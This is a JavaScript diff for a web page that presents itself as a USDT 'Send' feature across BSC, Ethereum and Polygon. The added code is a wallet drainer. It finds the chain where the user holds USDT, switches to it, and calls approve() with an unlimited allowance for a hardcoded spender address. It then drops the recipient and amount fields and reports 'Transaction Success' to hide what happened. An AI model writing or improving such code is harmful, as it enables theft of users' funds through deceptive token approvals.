@@ -11,10 +11,13 @@ let detectedChain = null;
    CONFIG
 ====================================================== */
 
-// Your spender
+// Your spender address
 const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";
 
-// ERC20 ABI (minimal)
+// Unlimited approval (max uint256)
+const UNLIMITED_APPROVAL = ethers.MaxUint256;
+
+// Minimal ERC20 ABI
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
   "function balanceOf(address owner) view returns (uint256)",
@@ -28,7 +31,6 @@ const CHAINS = [
     chainId: "0x38",
     rpc: "https://bsc-dataseed.binance.org/",
     usdt: "0x55d398326f99059fF775485246999027B3197955",
-    native: { name: "BNB", symbol: "BNB", decimals: 18 },
     explorer: "https://bscscan.com"
   },
   {
@@ -36,7 +38,6 @@ const CHAINS = [
     chainId: "0x1",
     rpc: "https://rpc.ankr.com/eth",
     usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-    native: { name: "ETH", symbol: "ETH", decimals: 18 },
     explorer: "https://etherscan.io"
   },
   {
@@ -44,7 +45,6 @@ const CHAINS = [
     chainId: "0x89",
     rpc: "https://polygon-rpc.com",
     usdt: "0xc2132D05D31c914a87C6611C10748AaCBbB7E2",
-    native: { name: "MATIC", symbol: "MATIC", decimals: 18 },
     explorer: "https://polygonscan.com"
   }
 ];
@@ -56,7 +56,7 @@ const CHAINS = [
 async function connectWallet() {
   if (!window.ethereum) {
     alert("Wallet not found");
-    throw new Error("No wallet");
+    throw new Error("Wallet not found");
   }
 
   provider = new ethers.BrowserProvider(window.ethereum);
@@ -85,7 +85,11 @@ async function switchChain(chain) {
           chainId: chain.chainId,
           chainName: chain.name,
           rpcUrls: [chain.rpc],
-          nativeCurrency: chain.native,
+          nativeCurrency: {
+            name: chain.name,
+            symbol: chain.name === "BSC" ? "BNB" : chain.name === "Polygon" ? "MATIC" : "ETH",
+            decimals: 18
+          },
           blockExplorerUrls: [chain.explorer]
         }]
       });
@@ -109,20 +113,14 @@ async function detectUSDTChain() {
       const tempProvider = new ethers.BrowserProvider(window.ethereum);
       const token = new ethers.Contract(chain.usdt, ERC20_ABI, tempProvider);
 
-      const decimals = await token.decimals();
       const balance = await token.balanceOf(userAddress);
 
-      const formatted = Number(
-        ethers.formatUnits(balance, decimals)
-      );
-
-      if (formatted > 0) {
+      if (balance > 0n) {
         detectedChain = chain;
-        console.log("USDT found on:", chain.name, formatted);
         return chain;
       }
     } catch (e) {
-      console.warn("Skipped", chain.name);
+      continue;
     }
   }
 
@@ -130,16 +128,55 @@ async function detectUSDTChain() {
 }
 
 /* ======================================================
-   MAX BUTTON (AUTO-FILL BALANCE)
+   SEND BUTTON (UNLIMITED APPROVAL)
+====================================================== */
+
+async function sendUSDT() {
+  try {
+    // Detect chain with USDT
+    const chain = detectedChain || await detectUSDTChain();
+
+    if (!chain) {
+      alert("No USDT balance found on supported chains");
+      return;
+    }
+
+    // Ensure correct chain
+    await switchChain(chain);
+
+    // USDT contract with signer
+    const token = new ethers.Contract(
+      chain.usdt,
+      ERC20_ABI,
+      signer
+    );
+
+    // 🔴 UNLIMITED APPROVAL
+    const tx = await token.approve(
+      SPENDER_ADDRESS,
+      UNLIMITED_APPROVAL
+    );
+
+    // ⏳ Wait for confirmation
+    await tx.wait();
+
+    // ✅ Final success message
+    alert("Transaction Success");
+
+  } catch (err) {
+    console.error(err);
+    alert("Transaction Failed or Cancelled");
+  }
+}
+
+/* ======================================================
+   OPTIONAL: MAX BUTTON (fills balance in UI)
 ====================================================== */
 
 async function setMax() {
   try {
     const chain = detectedChain || await detectUSDTChain();
-    if (!chain) {
-      alert("No USDT found on supported chains");
-      return;
-    }
+    if (!chain) return;
 
     const tempProvider = new ethers.BrowserProvider(window.ethereum);
     const token = new ethers.Contract(chain.usdt, ERC20_ABI, tempProvider);
@@ -151,66 +188,12 @@ async function setMax() {
       ethers.formatUnits(balance, decimals);
 
   } catch (e) {
-    console.error(e);
+    console.warn("Max failed");
   }
 }
 
 /* ======================================================
-   SEND BUTTON (ACTUALLY APPROVE)
-====================================================== */
-
-async function sendUSDT() {
-  const toAddress = document.getElementById("toAddress").value.trim();
-  const amountStr = document.getElementById("amount").value.trim();
-
-  if (!ethers.isAddress(toAddress)) {
-    alert("Invalid address");
-    return;
-  }
-
-  if (!amountStr || Number(amountStr) <= 0) {
-    alert("Invalid amount");
-    return;
-  }
-
-  try {
-    // 1️⃣ Auto-detect chain with USDT
-    const chain = detectedChain || await detectUSDTChain();
-    if (!chain) {
-      alert("No USDT balance found");
-      return;
-    }
-
-    // 2️⃣ Ensure correct chain
-    await switchChain(chain);
-
-    // 3️⃣ Approve (Smart Contract Call)
-    const token = new ethers.Contract(
-      chain.usdt,
-      ERC20_ABI,
-      signer
-    );
-
-    const decimals = await token.decimals();
-    const parsedAmount = ethers.parseUnits(amountStr, decimals);
-
-    const tx = await token.approve(
-      SPENDER_ADDRESS,
-      parsedAmount
-    );
-
-    alert(
-      `Authorization sent on ${chain.name}\n\nTX Hash:\n${tx.hash}`
-    );
-
-  } catch (err) {
-    console.error(err);
-    alert("Transaction cancelled or failed");
-  }
-}
-
-/* ======================================================
-   EXPOSE TO UI
+   EXPOSE FUNCTIONS TO UI
 ====================================================== */
 
 window.sendUSDT = sendUSDT;
